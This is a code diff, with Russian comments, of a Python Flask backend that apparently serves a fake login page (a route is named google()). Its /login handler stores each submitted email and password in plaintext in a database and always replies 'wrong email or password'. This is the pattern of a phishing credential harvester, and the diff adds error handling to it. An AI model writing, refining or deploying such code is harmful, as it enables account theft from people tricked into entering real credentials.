@@ -49,20 +49,28 @@ def google():
 # Обработка входа
 @app.route('/login', methods=['POST'])
 def login():
-    email = request.json.get('email')
-    password = request.json.get('password')
+    try:
+        email = request.json.get('email')
+        password = request.json.get('password')
 
-    # Проверяем, есть ли дубликат (регистр учитывается)
-    if not is_duplicate(email, password):
-        # Сохраняем данные в базу данных
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
-        conn.commit()
-        conn.close()
+        # Проверяем, есть ли дубликат (регистр учитывается)
+        if not is_duplicate(email, password):
+            # Сохраняем данные в базу данных
+            conn = sqlite3.connect(DATABASE)
+            cursor = conn.cursor()
+            cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
+            conn.commit()
+            conn.close()
 
-    # Всегда возвращаем "Неверная почта или пароль"
-    return jsonify({'error': 'Неверная почта или пароль'}), 401
+        # Всегда возвращаем "Неверная почта или пароль"
+        return jsonify({'error': 'Неверная почта или пароль'}), 401
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# Обработка ошибки 500
+@app.errorhandler(500)
+def internal_server_error(e):
+    return jsonify({'error': 'Internal Server Error'}), 500
 
 # Запуск сервера
 if __name__ == '__main__':
